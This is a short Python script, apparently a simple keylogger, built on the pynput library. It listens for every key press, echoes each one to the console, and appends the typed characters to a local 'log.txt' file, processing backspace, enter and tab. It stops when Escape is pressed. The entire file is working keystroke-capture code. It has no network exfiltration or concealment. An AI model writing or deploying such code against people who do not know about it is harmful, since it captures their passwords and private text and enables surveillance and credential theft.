import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count+=1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):                   # Writes keystrokes to file.
    with open("log.txt", "a") as f: 
        for key in keys:
            k = str(key).replace("'","")
            if k == "Key.space":
                f.write(' ')
            elif k == "Key.shift":
                f.write("")
            elif k == "Key.backspace":
                f.seek(0,2)             # End of file.
                size=f.tell()           # The size of the file.
                f.truncate(size-1)      # Reduce the size of the file by one
            elif k == "Key.enter":      
                f.write("\n")
            elif k == "Key.tab":
                f.write("\t") 
            elif k == "Key.esc":
                f.write("\n-----\n ~// END Of Session //~")
            elif k.find("Key") == -1:   # Record basic keystroke
                f.write(k)

def on_release(key):                    # Exit keylogger.
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
     